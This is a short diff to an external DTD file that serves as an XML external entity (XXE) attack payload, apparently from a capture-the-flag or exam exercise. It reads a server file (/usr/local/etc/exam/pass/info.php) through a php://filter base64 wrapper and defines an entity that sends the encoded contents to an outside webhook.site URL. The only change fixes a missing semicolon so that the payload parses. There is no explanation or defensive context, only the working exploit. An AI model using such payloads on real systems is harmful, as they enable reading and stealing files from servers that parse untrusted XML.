@@ -1,4 +1,4 @@
 <!ENTITY % output SYSTEM “php://filter/convert.base64-encode/resource=/usr/local/etc/exam/pass/info.php”>
 <!ENTITY % param “<!ENTITY exfil SYSTEM ‘https://webhook.site/20ba1683-a163-4457-9b06-5ed733ef7e50/?output=%output;'>”>
 %param;
-%dtd
+%dtd;
